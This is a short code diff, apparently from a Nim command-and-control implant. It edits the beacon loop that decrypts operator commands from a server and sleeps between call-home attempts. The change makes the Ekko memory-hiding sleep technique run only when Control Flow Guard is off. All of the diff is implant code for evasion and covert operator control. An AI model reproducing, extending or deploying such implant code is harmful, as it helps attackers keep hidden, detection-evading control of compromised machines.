@@ -3,7 +3,7 @@ import config
 import common
 when defined(windows):
     import windows/[windows_core]
-    import windows/utils/incl/nekko
+    import windows/utils/incl/[nekko, cfg]
 when defined(linux):
     import linux/[linux_core]
 # External imports
@@ -38,11 +38,11 @@ proc nimbo_main*(): void =
             continue
         server_content = parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
         if len(server_content) == 0:
-            sleep_time = calc_sleep_time(call_home_timeframe, call_home_jitter_percent)     
-            if memsleep_technique == 0:
+            sleep_time = calc_sleep_time(call_home_timeframe, call_home_jitter_percent)      
+            if memsleep_technique == 1 and not isControlFlowGuardEnabled():
+                nEkko(sleep_time)  
+            elif memsleep_technique == 0:
                 sleep(sleep_time)
-            elif memsleep_technique == 1:
-                nEkko(sleep_time)           
             continue
         else:
             for command in server_content:
